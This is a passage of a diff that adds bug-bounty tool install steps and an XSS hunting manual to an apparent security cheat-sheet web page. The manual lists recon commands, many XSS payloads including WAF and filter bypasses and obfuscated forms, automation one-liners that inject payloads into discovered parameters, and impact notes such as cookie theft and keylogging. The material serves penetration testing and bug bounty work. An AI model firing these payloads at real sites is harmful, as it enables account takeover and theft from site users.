+                        <div>go install github.com/ffuf/ffuf@latest</div>
+                        <div># Python tools</div>
+                        <div>pip install playwright sqlmap requests pyjwt patator</div>
+                        <div>playwright install</div>
+                        <div># Authentication tools</div>
+                        <div>apt install hydra nmap</div>
+                        <div># JWT specific tools</div>
+                        <div>git clone https://github.com/ticarpi/jwt_tool</div>
+                        <div>npm install -g jwt-cracker</div>
+                        <div># Wordlists</div>
+                        <div>git clone https://github.com/danielmiessler/SecLists</div>
+                        <div>echo "Complete bug bounty toolkit with auth tools installed! 🎯🔐"</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="xss-guide">
+            <div class="container">
+                <h2 class="section-title">🔥 XSS Hunting Field Manual (2025 Edition)</h2>
+                <div class="terminal">
+                    <div class="terminal-content">
+                        <div>root@cybersec:~$ cat xss_hunt.sh</div>
+                        <div>#!/bin/bash</div>
+                        <div>paramspider -d $1 -o xss_params.txt</div>
+                        <div>cat xss_params.txt | gf xss | qsreplace '&lt;svg/onload=alert(1)&gt;'</div>
+                        <div>dalfox pipe --custom-payload payloads.txt</div>
+                        <div class="typing">XSS hunting pipeline ready...</div>
+                    </div>
+                </div>
+
+                <div class="cards-grid">
+                    <div class="card">
+                        <h3>🔍 1. Recon & Discovery</h3>
+                        <p><strong>Target Parameters:</strong></p>
+                        <ul>
+                            <li><strong>High-Value Params:</strong> q, search, s, msg, redirect, url, next, return</li>
+                            <li><strong>Form Fields:</strong> Comments, feedback, profile updates</li>
+                            <li><strong>Headers:</strong> User-Agent, Referer, X-Forwarded-For, Origin</li>
+                            <li><strong>JS Files:</strong> DOM sinks (innerHTML, document.write, eval)</li>
+                        </ul>
+                        <p><strong>Discovery Commands:</strong></p>
+                        <ul>
+                            <li><code>paramspider -d target.com -o params.txt</code></li>
+                            <li><code>arjun -u https://target.com -oT arjun-params.txt</code></li>
+                            <li><code>linkfinder -i https://target.com/js/app.js -o cli</code></li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🎯 2. XSS Types Testing</h3>
+                        <p><strong>Reflected XSS:</strong></p>
+                        <ul>
+                            <li><code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+                            <li><code>&lt;svg/onload=alert(1)&gt;</code></li>
+                            <li><code>&lt;iframe src=javascript:alert(1)&gt;</code></li>
+                        </ul>
+                        <p><strong>Stored XSS:</strong></p>
+                        <ul>
+                            <li><code>&lt;script&gt;alert('StoredXSS')&lt;/script&gt;</code></li>
+                            <li><code>&lt;video&gt;&lt;source onerror=alert(1337)&gt;</code></li>
+                            <li>Use XSSHunter for blind detection</li>
+                        </ul>
+                        <p><strong>DOM-Based XSS:</strong></p>
+                        <ul>
+                            <li>Target: innerHTML, document.write, eval sinks</li>
+                            <li><code>#&lt;img src=x onerror=alert(1)&gt;</code></li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🧪 3. Context-Aware Payloads</h3>
+                        <p><strong>HTML Context:</strong></p>
+                        <ul>
+                            <li><code>&lt;svg/onload=alert(1)&gt;</code></li>
+                            <li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+                        </ul>
+                        <p><strong>Attribute Context:</strong></p>
+                        <ul>
+                            <li><code>" onmouseover=alert(1) "</code></li>
+                            <li><code>javascript:alert(1)</code></li>
+                        </ul>
+                        <p><strong>JavaScript Context:</strong></p>
+                        <ul>
+                            <li><code>';alert(1);//</code></li>
+                            <li><code>";alert(1);//</code></li>
+                        </ul>
+                        <p><strong>Template Contexts (AngularJS):</strong></p>
+                        <ul>
+                            <li><code>{{constructor.constructor('alert(1)')()}}</code></li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>💡 4. Bypass Techniques</h3>
+                        <p><strong>HTML Encoding Bypass:</strong></p>
+                        <ul>
+                            <li><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>
+                            <li>Double encoding: <code>%253Cscript%253E</code></li>
+                        </ul>
+                        <p><strong>WAF Evasion:</strong></p>
+                        <ul>
+                            <li>Case variation: <code>&lt;ScRipT&gt;alert(1)&lt;/sCrIPT&gt;</code></li>
+                            <li>Tag breaking: <code>&lt;scr&lt;script&gt;ipt&gt;</code></li>
+                        </ul>
+                        <p><strong>CSP Bypass:</strong></p>
+                        <ul>
+                            <li>Exploit unsafe-inline, unsafe-eval</li>
+                            <li>JSONP endpoints abuse</li>
+                            <li>Trusted CDN exploitation</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>🛠️ 5. Essential Tools</h3>
+                        <p><strong>Automated Scanners:</strong></p>
+                        <ul>
+                            <li><strong>Dalfox:</strong> <code>dalfox pipe --custom-payload payloads.txt</code></li>
+                            <li><strong>XSStrike:</strong> <code>xsstrike -u "target" --crawl</code></li>
+                            <li><strong>Nuclei:</strong> <code>nuclei -u target.com -t xss</code></li>
+                        </ul>
+                        <p><strong>Manual Testing:</strong></p>
+                        <ul>
+                            <li><strong>Burp Suite:</strong> Repeater + Intruder</li>
+                            <li><strong>Extensions:</strong> Logger++, Param Miner, DOM Invader</li>
+                            <li><strong>XSS Hunter:</strong> Blind XSS detection</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h3>💻 6. CLI Automation</h3>
+                        <p><strong>Quick Parameter Discovery:</strong></p>
+                        <ul>
+                            <li><code>cat urls.txt | gf xss | qsreplace '"&lt;script&gt;alert(1)&lt;/script&gt;'</code></li>
+                            <li><code>ffuf -w payloads/xss.txt -u 'target.com/page?input=FUZZ'</code></li>
+                        </ul>
+                        <p><strong>JS File Analysis:</strong></p>
+                        <ul>
+                            <li><code>waybackurls target.com | grep ".js" | tee js.txt</code></li>
+                            <li><code>grep -Ei 'innerHTML|document.write|eval' js_files.txt</code></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="terminal" style="margin-top: 2rem;">
+                    <div class="terminal-content">
+                        <div style="color: #ff5555;">⏱️ 30-Minute XSS Quick Sweep:</div>
+                        <div>0-5min: subfinder -d target.com | httpx > subs.txt</div>
+                        <div>5-10min: paramspider -d target.com | gf xss</div>
+                        <div>10-15min: qsreplace '&lt;svg/onload=alert(1)&gt;' | httpx</div>
+                        <div>15-20min: Manual Burp testing on forms</div>
+                        <div>20-25min: JS file DOM sink analysis</div>
+                        <div style="color: #00ff88;">25-30min: Obfuscation & bypass attempts</div>
+                    </div>
+                </div>
+
+                <div class="card" style="margin-top: 2rem; background: rgba(255, 85, 85, 0.1); border-left: 4px solid #ff5555;">
+                    <h3>🚨 Advanced Payload Bank</h3>
+                    <p><strong>Basic Payloads:</strong></p>
+                    <ul>
+                        <li><code>&lt;svg/onload=alert(1)&gt;</code></li>
+                        <li><code>&lt;details open ontoggle=alert(1)&gt;</code></li>
+                        <li><code>&lt;video&gt;&lt;source onerror=alert(1)&gt;</code></li>
+                    </ul>
+                    <p><strong>Obfuscated Payloads:</strong></p>
+                    <ul>
+                        <li><code>eval("al" + "ert(1)")</code></li>
+                        <li><code>new Function`alert(1)`</code></li>
+                        <li><code>&lt;math&gt;&lt;mtext&gt;&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+                    </ul>
+                </div>
+
+                <div class="card" style="margin-top: 1rem; background: rgba(255, 215, 0, 0.1); border-left: 4px solid #ffd700;">
+                    <h3>🎯 High-Impact XSS Locations</h3>
+                    <ul>
+                        <li><strong>Search Parameters:</strong> Most common reflection point</li>
+                        <li><strong>Error Messages:</strong> Often unfiltered output</li>
+                        <li><strong>User Profiles:</strong> Stored XSS goldmine</li>
+                        <li><strong>File Uploads:</strong> SVG, HTML file uploads</li>
+                        <li><strong>Admin Panels:</strong> Higher privilege context</li>
+                        <li><strong>Mobile Apps:</strong> WebView XSS vulnerabilities</li>
+                    </ul>
+                </div>
+
+                <div class="card" style="margin-top: 1rem; background: rgba(0, 255, 136, 0.1); border-left: 4px solid #00ff88;">
+                    <h3>💰 Bug Bounty XSS Impact Tips</h3>
+                    <ul>
+                        <li><strong>Account Takeover:</strong> Cookie theft + session hijacking</li>
+                        <li><strong>CSRF Bypass:</strong> XSS can bypass CSRF tokens</li>
+                        <li><strong>Phishing:</strong> Fake login forms via XSS</li>
+                        <li><strong>Keylogging:</strong> Capture user inputs</li>
+                        <li><strong>Defacement:</strong> Modify page content</li>
+                        <li><strong>Internal Network:</strong> XSS in admin panels</li>
+                    </ul>
                 </div>
             </div>
         </section>
@@ -887,4 +1808,3 @@
     </script>
 </body>
 </html>
-
